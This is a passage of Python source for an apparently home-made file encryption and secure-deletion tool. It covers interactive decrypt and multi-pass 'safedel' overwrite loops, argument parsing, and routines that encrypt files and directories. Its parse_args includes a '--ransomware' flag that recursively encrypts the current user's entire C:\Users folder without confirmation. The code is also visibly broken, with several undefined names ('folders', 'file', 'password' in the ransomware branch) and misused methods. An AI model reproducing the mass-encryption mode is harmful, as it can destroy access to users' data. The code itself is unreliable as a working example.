					files = tokenize(argument_files)
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					if files:
						self.cipher_file(
							files,
							verbose=True,
							password=password,
							keep_copy=keep_copy,
							cipher_method="decrypt"
						)
				if "-dr " in decryption_arguments or "--directory " in decryption_arguments:
					args1 = decryption_arguments.replace("-dr ", "")
					argument_directories = args1.replace("--directory ", "")
					
					directories = tokenize(argument_directories)
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					if directories:
						self.cipher_directory(
							directories,
							verbose=True,
							password=password,
							keep_copy=keep_copy,
							cipher_method="decrypt"
						)
				debug_info()
				
			if "safedel " in command.lower():
				safedel_arguments = command.replace("safedel ", "").lower()
				
				if "-fd" in safedel_arguments or "--fdel" in safedel_arguments:
					args1 = safedel_arguments.replace("-fd", "")
					safedel_arguments = args1.replace("--fdel", "")
					
					confirm = input("Do you wish to continue? This will remove deleted files from your disk. [Y/N]: ")
					
					if confirm.lower() == "y":
						pass
					else:
						print("fdel canceled, returning. . .")
						continue
					
					symbols = ['\\', '|', '/', '-']
					
					i = 0
					
					thread = self.thread_create(
						callback = freespace_overwrite
					)
					
					total_start_time = time.time()
					start_time = time.perf_counter()
					
					def get_tempfile_size():
						tempfile_size = 0
						
						while not self.interactive[f"freespace_overwrite | pass3_complete"]:
							if self.cleanup:
								break
							
							try:
								file_stats = os.stat("disk_filler_file.tmp")
								tempfile_size = file_stats.st_size
								
								size_in_gb = float(format(tempfile_size // (1024 * 1024 * 1024)))
								
								sys.stdout.write(f"| current temp file size: {size_in_gb:.2f} GB")
								sys.stdout.flush()
							except ZeroDivisionError:
								pass
							
							time.sleep(0.01)
					
					thread = self.thread_create(
						callback = get_tempfile_size
					)
					
					while True:
						if self.cleanup:
							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . stopped\n\n")
							break
						
						if self.interactive[f"freespace_overwrite | pass{current_pass}_complete"] == True:
							end_time = time.perf_counter()
							
							sys.stdout.write(f"\r")
							sys.stdout.write(f"{' ' for i in range(100)}")
							
							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . done [finished in {(end_time - start_time):.2f} seconds]\n\n")
							
							start_time = time.perf_counter()
							continue
						
						end_time = time.perf_counter()
						
						tempfile_size = 0
						
						elapsed_time = end_time - start_time
						mins, sec = divmod(elapsed_time, 60)
						
						sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . {symbols[i]} | ")
						
						sys.stdout.write(f"time elapsed: {int(mins)} minute{'s' if mins != 1 else ''} ")
						sys.stdout.write(f"{int(sec)} second{'s' if sec != 1 else ''} ")
						
						sys.stdout.flush()
						
						i = (i + 1) % len(symbols)
						time.sleep(0.1)
					
					total_end_time = time.time()
					print(f"total time elapsed for fdel: {(total_end_time - total_start_time):.2f} seconds\n")
					
					continue
				
				files = tokenize(safedel_arguments)
				confirm = input("Do you wish to continue? This process will be irriversible. [Y/N]: ")
				
				if confirm.lower() == "y":
					pass
				else:
					print("safedel canceled, returning. . .")
					continue
				
				print(files)
				
				for current_file, file_to_delete in enumerate(files):
					set_progress_bar = False
					
					symbols = ['\\', '|', '/', '-']
					i = 0
						
					self.interactive[f"{files[current_file]} | cipher_complete"] = False
					
					for iteration in range(16):
						self.interactive[f"{files[current_file]} | pass{iteration + 1}_complete"] = False
					
					current_file_size = os.path.getsize(files[current_file])
					
					def call_cipher(cipher_mode="encrypt", *args):
						self.encrypt_file(*args) if cipher_mode == "encrypt" else self.decrypt_file(*args)
						
						self.interactive[f"{files[current_file]} | cipher_complete"]
						
					thread = self.thread_create(
						callback = call_cipher,
						
						input_file = file,
						password = password,
						keep_copy = keep_copy,
						
						hash_pepper = self.hash_pepper,
						password_pepper = self.password_pepper
					)
					
					total_start_time = time.time()
					
					print(f"\n{files[current_file]}: ")
					start_time = time.perf_counter()
					
					while True:
						if self.cleanup:
							sys.stdout.write(f"\rwaiting for encryption to finish. . . stopped\n\n")
							break
						
						if self.interactive[f"{files[current_file]} | cipher_complete"] == True:
							end_time = time.perf_counter()
							sys.stdout.write(f"\rwaiting for encryption to finish. . . done [finished in {(end_time - start_time):.2f} seconds]\n\n")
							
							break
						
						sys.stdout.write(f"\rwaiting for encryption to finish. . . {symbols[i]}")
						i = (i + 1) % len(symbols)
						
						time.sleep(0.1)
					
					thread = self.thread_create(
						callback = file_overwrite,
						file_path = files[current_file],
						file_size = current_file_size
					)
					
					current_pass = 1
					start_time = time.perf_counter()
					
					while True:
						if self.cleanup:
							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . stopped\n\n")
							break
						
						if self.interactive[f"{files[current_file]} | pass{current_pass}_complete"] == True:
							end_time = time.perf_counter()
							
							sys.stdout.write("\r")
							
							for i in range(100):
								sys.stdout.write(" ")
							
							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . done [finished in {(end_time - start_time):.2f} seconds]\n\n")
							
							current_pass += 1
							
							if current_pass == 17:
								break
							
							start_time = time.perf_counter()
							continue
						
						end_time = time.perf_counter()
						
						tempfile_size = 0
						
						elapsed_time = end_time - start_time
						mins, sec = divmod(elapsed_time, 60)
						
						i = (i + 1) % len(symbols)
						
						sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . {symbols[i]} | ")
						
						sys.stdout.write(f"time elapsed: {int(mins)} minute{'s' if mins != 1 else ''} ")
						sys.stdout.write(f"{int(sec)} second{'s' if sec != 1 else ''} ")
						
						sys.stdout.flush()
						
						time.sleep(0.1)
					
					total_end_time = time.time()
					print(f"total time elapsed for {files[current_file]}: {(total_end_time - total_start_time):.2f} seconds\n")
					print(worker_errors)
			...

	def parse_args(self):
		self.args = self.parser.parse_args()
		
		# Guard clauses
		if self.args.interactive:
			try:
				pycrypter_interactive()
			except Exception as err:
				err_name = type(err).__name__
					
				print(f"An unexpected error occured! Details: \n")
				traceback.print_exc()
			
			return
		
		if self.args.threads:
			self.thread_mgr.semaphore = self.args.threads
		
		if self.args.encrypt and self.args.decrypt:
			raise ValueError("expected 1 required argument [-e/--encrypt] or [-d/--decrypt], got 2")

		if not self.args.encrypt and not self.args.decrypt:
			raise ValueError("expected 1 required argument [-e/--encrypt] or [-d/--decrypt]")
		
		# atexit.register(debug_info)
		
		if self.args.ransomware:
			cipher_method = "encrypt" if self.args.encrypt else "decrypt"
			current_user = os.getlogin()
			
			self.cipher_directory(
				f"C:\\Users\\{current_user}",
				verbose = self.args.verbose,
				password = password,
				keep_copy = self.args.keep_copy,
				cipher_method = cipher_method
			)
			sys.exit()

		if self.args.file is None and self.args.directory is None:
			raise ValueError("expected valid file/directory paths, got None")
		
		password = getpass.getpass("Enter a password: ")
		
		cipher_method = "encrypt" if self.args.encrypt else "decrypt"
		
		sys.stdout.write("|-------------------------------------------------------------|\n")
		sys.stdout.flush()
		
		if self.args.file:
			self.cipher_file(
				self.args.file,
				verbose = self.args.verbose,
				password = password,
				keep_copy = self.args.keep_copy,
				cipher_method = cipher_method
			)
		
		if self.args.directory:
			self.cipher_directory(
				self.args.directory,
				verbose = self.args.verbose,
				password = password,
				keep_copy = self.args.keep_copy,
				cipher_method = cipher_method
			)
	
	# Check each file/directory
	def cipher_file(self, file_list, skip_files=None, verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
		if cipher_method not in ["encrypt", "decrypt"]:
			raise TypeError(f'cipher_method expected "encrypt" or "decrypt", got {cipher_method}')
		
		if not skip_files:
			skip_files = set()
		
		files = set()

		for file in file_list:
			if os.path.isfile(file):
				files.add(file)
				continue

			if len(files) > 1:
				if os.path.isdir(file):
					print(f"IsADirectoryError: [Errno 21] Is a directory: {file}")
				else:
					print(f"FileNotFoundError: [Errno 2] No such file: {file}")
			else:
				if os.path.isdir(file):
					raise IsADirectoryError(f"[Errno 21] Is a directory: {file}")
				else:
					raise FileNotFoundError(f"[Errno 2] No such file: {file}")
		
		for i, file in enumerate(files):
			if self.cleanup:
				break
			
			def call_cipher(*args, **kwargs):
				if cipher_method == "encrypt":
					self.encrypt_file(*args, **kwargs)
				else:
					self.decrypt_file(*args, **kwargs)
				
			thread = self.thread_create(
				callback = call_cipher,
				
				input_file = file,
				password = password,
				keep_copy = keep_copy,
				
				hash_pepper = self.hash_pepper,
				password_pepper = self.password_pepper
			)
		
		thread.join()
		
		if verbose:
			print(f"\n|-------------------------------------------------------------|\n\nTotal files : {files_count}")
			print(f"Total files [processed] : {files_finished}\n")

			print(f"Total: {files_count} | Completed: {files_finished} | Error thrown: {files_exception_thrown}\n")

			print(f"Extra information: \nfiles_count: {files_count} | len(files): {len(files)}")
			print(f"files_finished: {files_finished} | files_finished == files_count: {files_finished == files_count}\n")

			# File and directory errors
			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
			print(f"{Fore.LIGHTGREEN_EX}File errorlist: (-dr){Style.RESET_ALL}\n")

			for err in files_errorlist:
				print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
				print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")

	def cipher_directory(self, directories, skip_directories=[], verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
		if cipher_method not in ["encrypt", "decrypt"]:
			raise ValueError(f'cipher_method expected "encrypt" or "decrypt", got {cipher_method}')
		
		files = []
		files_errorlist = []

		for folder in directories:
			if os.path.isdir(folder):
				folders.append(folder)
				continue
			
			if len(directories) > 1:
				if os.path.isdir(folder):
					print(f"NotADirectoryError: [Errno 21] Is a directory: {folder}")
				else:
					print(f"FileNotFoundError: [Errno 2] No such file: {folder}")
			else:
				if os.path.isdir(folder):
					raise NotADirectoryError(f"[Errno 20] Is a directory: {folder}")
				else:
					raise FileNotFoundError(f"[Errno 2] No such directory: {folder}")

		for i, folder in enumerate(folders):
			returned_files = iterate_dir(folder, iterate_tree=True, skip_dirs=skip_directories)
			
			files.add(*returned_files)
		
		for i, file in enumerate(files):
			if self.cleanup:
				break
			
			def call_cipher(*args, **kwargs):
				if cipher_method == "encrypt":
					self.encrypt_file(*args, **kwargs)
				else:
					self.decrypt_file(*args, **kwargs)
				
			thread = self.thread_create(
				callback = call_cipher,
				
				input_file = file,
				password = password,
				keep_copy = keep_copy,
				
				hash_pepper = self.hash_pepper,
				password_pepper = self.password_pepper
			)
		
		thread.join()

		if verbose:
			print(f"\n|-------------------------------------------------------------|\n\nTotal files : {files_count}")
			print(f"Total files [processed] : {files_finished}\n")

			print(f"Total: {files_count} | Completed: {files_finished} | Error thrown: {files_exception_thrown}\n")

			print(f"Extra information: \nfiles_count: {files_count} | len(files): {len(files)}")
			print(f"files_finished: {files_finished} | files_finished == files_count: {files_finished == files_count}\n")

			# File and directory errors
			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
			print(f"{Fore.LIGHTGREEN_EX}File errorlist: (-dr){Style.RESET_ALL}\n")

			for err in files_errorlist:
				print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
				print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
		
if __name__ == "__main__":
	main = Main()
	
	def script_cleanup(signal=0, frame=None):
		main.cleanup = True
		DataOverwriter.stop()
		
		cleanup_handler(signal=signal, frame=None, exit_reason="KeyboardInterrupt")
	
	if platform.system() == "Windows":
		# kernel32 signal handler
		kernel32 = ctypes.windll.kernel32
		handler_type = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_ulong)

		handler_func = handler_type(lambda signal: script_cleanup(signal))
		kernel32.SetConsoleCtrlHandler(handler_func, True)

		signal.signal(signal.SIGINT, lambda signal, frame: None)
	else:
		signal.signal(signal.SIGINT, lambda signal, frame: script_cleanup(signal, frame=frame))
	
	main.parse_args()
